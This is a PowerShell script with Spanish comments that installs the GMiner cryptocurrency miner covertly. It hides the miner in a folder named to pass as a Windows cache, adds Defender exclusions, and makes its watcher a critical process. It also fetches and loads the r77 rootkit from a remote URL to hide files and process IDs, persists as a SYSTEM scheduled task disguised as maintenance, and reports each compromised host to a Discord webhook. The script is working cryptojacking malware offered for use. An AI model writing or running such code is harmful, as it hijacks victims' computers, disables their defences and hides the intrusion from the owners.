#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
    Includes Critical Process protection (with safe shutdown) and r77 Rootkit.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -Diagnose
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- paths -----------------------------------------------------------
$Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir   = Join-Path $Root 'logs'
$ExePath  = Join-Path $Root 'WinCache.exe'
$SelfPs   = Join-Path $Root 'WinCache.ps1'
$LogFile  = Join-Path $LogDir 'miner.log'
$TaskName = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class ProcessProtector {
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int infoClass, ref int info, int infoLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetConsoleCtrlHandler(CtrlHandler handler, bool add);

    delegate bool CtrlHandler(int ctrlType);
    static CtrlHandler _handler;

    static IntPtr _hProcess = IntPtr.Zero;
    static int _isCritical = 1;
    const int ProcessBreakOnTermination = 0x1D;

    public static void SetCriticalForPid(int pid, bool critical) {
        _isCritical = critical ? 1 : 0;
        try {
            IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
            NtSetInformationProcess(hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
        } catch {}
    }

    public static void RegisterShutdownHandler() {
        _hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
        _handler = new CtrlHandler(HandleCtrl);
        SetConsoleCtrlHandler(_handler, true);
    }

    static bool HandleCtrl(int ctrlType) {
        // 0=C, 1=Break, 2=Close, 5=Logoff, 6=Shutdown
        if (ctrlType == 2 || ctrlType == 5 || ctrlType == 6) {
            _isCritical = 0;
            if (_hProcess != IntPtr.Zero) {
                NtSetInformationProcess(_hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
            }
        }
        return false;
    }
}
"@

function Send-DiscordWebhook {
    param(
        [string]$WebhookUrl,
        [string]$Title,
        [string]$Message,
        [int]$Color = 3066993
    )
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    $payload = [ordered]@{
        embeds = @(
            [ordered]@{
                title       = $Title
                description = $Message
                color       = $Color
                timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }
        )
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes `
            -ContentType 'application/json; charset=utf-8' `
            -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch {
        $errMsg = $_.Exception.Message
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
            $errMsg += " | Discord: $($_.ErrorDetails.Message)"
        }
        Write-Warning "Webhook failed: $errMsg"
        return $false
    }
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook `
        -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado. Revisa el canal.' }
    else     { Write-Host '[-] Falló. Lee el warning de arriba.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }

    Section 'Install path'
    Line 'Root'        $Root
    Line 'Exists'      (Test-Path $Root)
    Line 'Hidden'      (if (Test-Path $Root) { ((Get-Item $Root -Force).Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0 } else { 'n/a' })
    Line 'WinCache.exe'(Test-Path $ExePath)
    Line 'WinCache.ps1'(Test-Path $SelfPs)
    Line 'miner.log'   $LogFile

    Section 'Scheduled Task'
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) {
        Line 'Task Name' $task.TaskName
        Line 'State'     $task.State
    } else {
        Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
    }

    Section 'Defender exclusions'
    try {
        $mp = Get-MpPreference
        $paths  = @($mp.ExclusionPath)
        $procs  = @($mp.ExclusionProcess)
        Line 'ExclusionPath match'    ($paths -contains $Root)
        Line 'ExclusionProcess match' ($procs -contains 'WinCache.exe')
    } catch {
        Write-Host "  No se pudo consultar Defender: $_" -ForegroundColor Yellow
    }

    Section 'Processes'
    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
    if ($watchers) {
        foreach ($w in $watchers) {
            Line "Watcher PID $($w.ProcessId)" "PowerShell corriendo con -Run"
        }
    } else {
        Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
    }
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) {
        foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" }
    } else {
        Write-Host '  Miner NO está corriendo.' -ForegroundColor Yellow
    }

    Section 'Last 15 lines of miner.log'
    if (Test-Path $LogFile) {
        Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "  $_" }
    } else {
        Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
    }

    Write-Host ''
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-File', "`"$scriptPath`"")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) {
                if ($v) { $a += "-$k" }
            } else {
                if ("$v" -match '\s') { $a += @("-$k", "`"$v`"") }
                else                  { $a += @("-$k", "$v")       }
            }
        }
        $a += '-NoElevate'
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    
    if (-not $Wallet -or -not $Pool -or -not $Algo) {
        Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] CRITICAL: Faltan argumentos Wallet/Pool/Algo en -Run"
        exit 1
    }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -Path $LogFile -Value "$ts [$Level] $Msg" -Encoding UTF8
    }

    # HACER EL WATCHER CRÍTICO Y PROTEGERLO CONTRA APAGADO
    [ProcessProtector]::SetCriticalForPid($PID, $true)
    [ProcessProtector]::RegisterShutdownHandler()
    Write-Session "Watcher marcado como PROCESO CRÍTICO (con protección de apagado)."

    # --- INTEGRACIÓN ROOTKIT (r77) ---
    Write-Session "Iniciando integración de rootkit..."
    $rkUrl = "https://github.com/UnfairAdventage/AutoMine/raw/refs/heads/main/rootkit.dll"
    try {
        # 1) Descargar rootkit.dll 
        $bytes = (New-Object Net.WebClient).DownloadData($rkUrl)  
        $asm   = [Reflection.Assembly]::Load($bytes)  
        
        # 2) Invocar el EntryPoint (instala los hooks del r77)  
        $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
        Write-Session "Rootkit DLL cargado e inicializado correctamente."

        # 3) rootkitaddpath: registrar la ruta a ocultar  
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $ExePath, 'String')  
        $rk.Close()  
        Write-Session "Rutas ocultas registradas en el rootkit."

        # 4) rootkitaddpid: registrar el PID a ocultar (Watcher)  
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord')  
        $rk.Close()  
        Write-Session "PID del watcher ($PID) oculto en el rootkit."
    } catch {
        Write-Session "Error al integrar rootkit: $_" 'WARN'
    }
    # ---------------------------------

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $warnRe  = 'connection (refused|reset|closed|timed? ?out)|cannot connect|cuda error'
    
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"

    Write-Session "===== watcher started (pid $PID) ====="
    Write-Session "exe=$ExePath  pool=$Pool  algo=$Algo  worker=$Worker"

    $restarts = 0
    $maxRestarts = 10
    $restartDelay = 30
    $notifiedStart = $false

    while ($true) {
        Write-Session "launching miner (attempt $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $ExePath
        $psi.Arguments              = $argStr
        $psi.WorkingDirectory       = $Root
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow         = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        try {
            $proc.Start() | Out-Null
            
            # 5) Ocultar también el PID del Minero en el rootkit
            try {
                $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
                $rk.SetValue([IO.Path]::GetRandomFileName(), $proc.Id, 'DWord')  
                $rk.Close()  
                Write-Session "PID del minero ($($proc.Id)) oculto en el rootkit."
            } catch {}

            if (-not $notifiedStart -and $DiscordWebhook) {
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n*(Proceso Crítico, Rootkit y Safe-Shutdown Activados)*"
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "failed to start miner: $_" 'FATAL'
            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "❌ Miner Failed to Start" -Message "Error: $_" -Color 15158332 | Out-Null }
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $subOut = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q
        $subErr = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q

        $proc.BeginOutputReadLine()
        $proc.BeginErrorReadLine()
        $writer = [System.IO.StreamWriter]::new($LogFile, $true, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $ts  = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                $lvl = 'INFO'
                if ($line -match $fatalRe)    { $lvl = 'FATAL' }
                elseif ($line -match $warnRe) { $lvl = 'WARN'  }
                $writer.WriteLine("$ts [$lvl] $line")
            } else {
                Start-Sleep -Milliseconds 200
            }
        }

        $proc.WaitForExit()
        $exit = $proc.ExitCode
        $writer.Close()
        Unregister-Event -SourceIdentifier $subOut.Name -ErrorAction SilentlyContinue
        Unregister-Event -SourceIdentifier $subErr.Name -ErrorAction SilentlyContinue
        $proc.Dispose()

        Write-Session "miner exited (code $exit)" 'WARN'
        $restarts++
        if ($restarts -ge $maxRestarts) {
            Write-Session "max restarts ($maxRestarts) reached, stopping" 'FATAL'
            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "⚠️ Miner Stopped" -Message "Max restarts ($maxRestarts) reached." -Color 15158332 | Out-Null }
            break
        }
        Write-Session "restarting in ${restartDelay}s"
        Start-Sleep -Seconds $restartDelay
    }
    exit 0
}

# ---------- folders ---------------------------------------------------------
foreach ($d in @($Root, $LogDir)) {
    if (-not (Test-Path $d)) {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
        Write-Host "[+] Created $d"
    }
}
try {
    $item = Get-Item $Root -Force
    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) {
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
} catch {}

# ---------- Defender exclusions ---------------------------------------------
try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) {
        Add-MpPreference -ExclusionPath $Root -ErrorAction Stop
        Write-Host "[+] Defender exclusion (path): $Root"
    }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') {
        Add-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction Stop
        Write-Host "[+] Defender exclusion (process): WinCache.exe"
    }
} catch {
    Write-Warning "Defender exclusions could not be set: $_"
}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Fetching GMiner (windows64, latest release)...'
    $api = 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest'
    $rel = Invoke-RestMethod -Uri $api -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    if (-not $asset) { throw 'windows64 asset missing from latest release.' }
    $tmp   = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}'     -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    if (-not $inner) { throw 'miner.exe not found in archive.' }
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Installed $ExePath"
} else {
    Write-Host '[=] WinCache.exe present'
}

# ---------- worker hash -----------------------------------------------------
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
        $hash  = $sha.ComputeHash($bytes)
    } finally {
        $sha.Dispose()
    }
    $shortHash = [System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower()
    $Worker = "rig_$shortHash"
}

# ---------- install self ----------------------------------------------------
if ($scriptPath -ne $SelfPs) {
    Copy-Item $scriptPath $SelfPs -Force
    Unblock-File $SelfPs -ErrorAction SilentlyContinue

    $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
    if ($head -notmatch '^#Requires' -and $head -notmatch '^<#' -and $head -notmatch '^\[CmdletBinding') {
        Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
        throw "WinCache.ps1 copiado no parece PowerShell válido (primera línea: '$head'). Abortando para no romper el auto-arranque."
    }
    Write-Host "[+] Installed $SelfPs"
}

# ---------- scheduled task --------------------------------------------------
Write-Host '[*] Registrando tarea programada con parámetros inyectados...'
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Mantenimiento en segundo plano de WinCache" | Out-Null
Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"

# ---------- launch watcher (ahora mismo) ------------------------------------
$oldWatchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
foreach ($w in $oldWatchers) {
    [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
    Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
}
Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

$p = $null
if ($Foreground) {
    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
} else {
    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
    Write-Host "[+] Watcher running (pid $($p.Id))"
}

# ---------- notify and summary ----------------------------------------------
if ($DiscordWebhook) {
    $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n$pidInfo"
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Deployment Complete" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  Mining in background. Auto-start enabled via Task Scheduler.'
Write-Host "  Install : $Root"
Write-Host '  PROTECCIÓN: Proceso Crítico (Safe Shutdown) y Rootkit Activados.'
Write-Host "  Log     : $LogFile"
Write-Host ''
Write-Host '  Follow log:'
Write-Host "    Get-Content `"$LogFile`" -Wait -Tail 20"
Write-Host ''
Write-Host '  Diagnose:'
Write-Host '    .\Mine.ps1 -Diagnose'
Write-Host ''
Write-Host '=================================================='